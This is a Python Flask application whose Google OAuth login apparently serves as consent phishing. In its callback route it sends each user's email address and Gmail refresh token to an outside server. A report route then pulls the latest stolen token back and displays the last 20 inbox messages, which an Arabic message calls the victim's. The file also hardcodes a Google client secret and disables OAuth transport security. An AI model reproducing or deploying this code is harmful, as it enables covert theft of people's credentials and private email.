import os
import base64
import json
import traceback
import requests
from flask import Flask, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# بيانات الاعتماد والمسارات
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://bashar-7fw9.onrender.com/callback'
TOKEN_SERVER_URL = 'https://bmapps.pythonanywhere.com' 

SCOPES = [
   'https://www.googleapis.com/auth/gmail.readonly',
    'openid',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile'
]

def create_flow():
    return Flow.from_client_config(
        client_config={ "web": { "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "auth_uri": "https://accounts.google.com/o/oauth2/auth", "token_uri": "https://oauth2.googleapis.com/token", "redirect_uris": [REDIRECT_URI] }},
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

@app.route('/callback')
def callback():
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    try:
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token
        if refresh_token:
            try:
                # إرسال التوكن إلى الخادم الأول (يبقى كما هو)
                payload = {'text_data': f"Email: {user_email}\nRefreshToken: {refresh_token}"}
                requests.post(f"{TOKEN_SERVER_URL}/receive_data", data=payload, timeout=10)
            except Exception as send_error:
                print(f"Failed to send token: {send_error}")
    except Exception as e:
        print(f"An error occurred during callback: {e}")
        
    return redirect(url_for('show_report'))

@app.route('/report')
def show_report():
    try:
        # ✅ التعديل: إضافة هيدر User-Agent لمحاكاة متصفح حقيقي
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # إرسال الطلب مع الهيدر الجديد
        response = requests.get(f"{TOKEN_SERVER_URL}/get_last_token", headers=headers, timeout=15)
        
        if response.status_code == 200 and 'application/json' in response.headers.get('Content-Type', ''):
            token_data = response.json()
            refresh_token = token_data.get('last_token')
        else:
            return f"<h1>خطأ في استلام البيانات من خادم التوكن</h1><p>الحالة: {response.status_code}</p><pre>{response.text}</pre>", 502

        if not refresh_token:
            return "<h2>لم يتم العثور على Refresh Token صالح في الرد.</h2>", 404

        # --- باقي كود عرض التقرير يبقى كما هو ---
        credentials = Credentials(
            token=None, refresh_token=refresh_token,
            token_uri='https://oauth2.googleapis.com/token',
            client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
            scopes=['https://www.googleapis.com/auth/gmail.readonly']
        )
        service = build('gmail', 'v1', credentials=credentials)
        result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
        messages = result.get('messages', [])
        
        # ... (باقي الكود لعرض الرسائل لم يتغير)
        if not messages: return "<h2>لم يتم العثور على رسائل في البريد الوارد للضحية.</h2>"
        emails_data = []
        def batch_callback(request_id, response, exception):
            if exception is None: emails_data.append(response)
            else: print(f"Batch request error: {exception}")
        batch = service.new_batch_http_request(callback=batch_callback)
        for msg in messages:
            batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
        batch.execute()
        html_content = """...""" # (كود HTML الطويل)
        html_content = """
        <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل</title>
        <style>body { font-family: sans-serif; margin: 20px; background-color: #f8f9fa;} h1 {text-align: center;} .email { background-color: #fff; border: 1px solid #ddd; margin-bottom: 10px; border-radius: 8px;} .email-header { padding: 15px; cursor: pointer; background-color: #f1f3f5;} .email-header h2 { font-size: 1.1rem; margin: 0;} .email-header small { color: #6c757d; } .email-body { padding: 20px; border-top: 1px solid #ddd; display: none;} .email-body pre { white-space: pre-wrap; font-family: monospace;}</style>
        <script>function toggleMessage(id) { var e = document.getElementById('body-' + id); e.style.display = e.style.display === "none" ? "block" : "none"; }</script>
        </head><body><h1>تقرير آخر 20 رسالة</h1>
        """
        for msg_data in emails_data:
            payload = msg_data.get('payload', {})
            headers = payload.get('headers', [])
            subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
            sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
            def find_body(parts):
                if parts:
                    for part in parts:
                        if part.get('mimeType') == 'text/plain' and 'data' in part['body']:
                            return f"<pre>{base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')}</pre>"
                return ""
            body = find_body(payload.get('parts')) if 'parts' in payload else (f"<pre>{base64.urlsafe_b64decode(payload.get('body', {}).get('data', '')).decode('utf-8', 'ignore')}</pre>" if payload.get('mimeType') == 'text/plain' else "")
            if not body: body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"
            html_content += f"""<div class="email"><div class="email-header" onclick="toggleMessage('{msg_data['id']}')"><h2>{subject}</h2><small>من: {sender}</small></div><div class="email-body" id="body-{msg_data['id']}" style="display:none;">{body}</div></div>"""
        html_content += "</body></html>"
        
        return Response(html_content, mimetype='text/html; charset=utf-8')


    except requests.exceptions.RequestException as e:
        return f"<h1>خطأ في الاتصال بخادم التوكن</h1><p>{e}</p>", 500
    except Exception as e:
        print(f"Error generating report: {traceback.format_exc()}")
        return "<h1>حدث خطأ فادح أثناء توليد التقرير.</h1><p>قد يكون الـ Refresh Token غير صالح أو تم إبطاله.</p>", 500